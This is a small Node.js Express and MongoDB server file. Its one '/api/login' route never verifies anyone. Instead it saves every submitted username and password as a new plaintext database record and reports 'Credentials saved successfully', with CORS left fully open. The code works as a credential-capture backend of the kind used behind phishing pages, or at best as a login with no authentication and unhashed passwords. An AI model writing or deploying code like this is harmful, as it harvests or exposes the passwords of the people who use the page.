const express = require('express');
const mongoose = require('mongoose');
const cors = require('cors');
const bodyParser = require('body-parser');
require('dotenv').config();

const app = express();
const PORT = 5000;

app.use(cors());
app.use(bodyParser.json());

// MongoDB Connection
mongoose.connect(process.env.MONGODB_URI, {
  useNewUrlParser: true,
  useUnifiedTopology: true
})
.then(() => console.log("✅ MongoDB Connected"))
.catch((err) => console.error("❌ MongoDB Error:", err));

// Mongoose User Model
const User = mongoose.model('User', new mongoose.Schema({
  username: String,
  password: String
}));

// Store login credentials every time user logs in
app.post('/api/login', async (req, res) => {
  const { username, password } = req.body;

  try {
    const newUser = new User({ username, password });
    await newUser.save();
    return res.status(200).json({ message: 'Credentials saved successfully' });
  } catch (error) {
    console.error('Error saving credentials:', error);
    return res.status(500).json({ message: 'Server error' });
  }
});

app.listen(PORT, () => console.log(`🚀 Server running at http://localhost:${PORT}`));
